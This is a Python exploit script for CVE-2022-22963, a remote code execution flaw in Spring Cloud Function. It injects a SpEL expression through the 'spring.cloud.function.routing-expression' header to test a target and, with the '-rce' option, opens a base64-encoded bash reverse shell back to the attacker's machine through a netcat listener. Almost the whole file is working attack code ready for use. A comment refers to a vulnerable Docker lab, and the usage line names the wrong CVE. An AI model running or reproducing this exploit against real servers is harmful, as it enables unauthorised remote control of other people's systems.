#! /usr/bin/python3
# CVE-2022-22963
# Spring Cloud Function RCE
# version : 3.1.0~3.1.6, 3.2.0~3.2.2
# version(reg) : ^3\.(1\.[0-6]|2\.[0-2])$

import subprocess
import argparse 
import requests
import socket, sys, time
from threading import Thread
import base64
import os

print('''===========================\n      CVE-2022-22963\n Spring Cloud Function RCE\n===========================''')

parser = argparse.ArgumentParser(usage="python CVE-2022-0543.py -u <Target URL> -rce")
parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080/)')
parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
args = parser.parse_args()


def nc_listener():
    os.system("nc -lnvp 22963")


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP = Get_My_IP()


def Detected_Vulnerability(URL): 
    payload = f'T(java.lang.Runtime).getRuntime().exec("touch /tmp/cve-2022-22963")'
    body = '.'
    headers = {'spring.cloud.function.routing-expression':payload}
    
    try:
        response = requests.post(url = URL, data = body, headers = headers, verify=False, timeout=5)
        if response.status_code == 500:
            print(f"[*] Detected Vulnerability : True")
            print("----------------------------------")
            return True
        else:
            print(f"[-] Detected Vulnerability : False")
            return False
    except requests.RequestException as e:
        print(f"[-] Detected Vulnerability : False")
        return False



def exploit(URL):
    listener_thread = Thread(target=nc_listener)
    listener_thread.start()
    time.sleep(1)

    command = f"bash -i >& /dev/tcp/{attacker_IP}/22963 0>&1"
    rce_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'


    #PoC
    payload = f'T(java.lang.Runtime).getRuntime().exec("{rce_command}")'
    body = '.'
    headers = {'spring.cloud.function.routing-expression':payload}

    try:
        response = requests.post(url = URL, data = body, headers = headers, verify=False, timeout=5)
        print(f"[+] Remote Code Execution successful!")
        return response 

    except requests.RequestException as e:
        print(f"[-] Remote Code Execution failed: {str(e)} ")
        return False



if __name__ == "__main__":
    URL=args.URL.rstrip("/")+"/functionRouter" #취약한 Docker 기준입니다
    print("[+] Target URL : "+URL)

    if Detected_Vulnerability(URL):
        
        if args.RCE:
            exploit(URL)
        else:
            print(f"To execute an RCE, add the -rce option")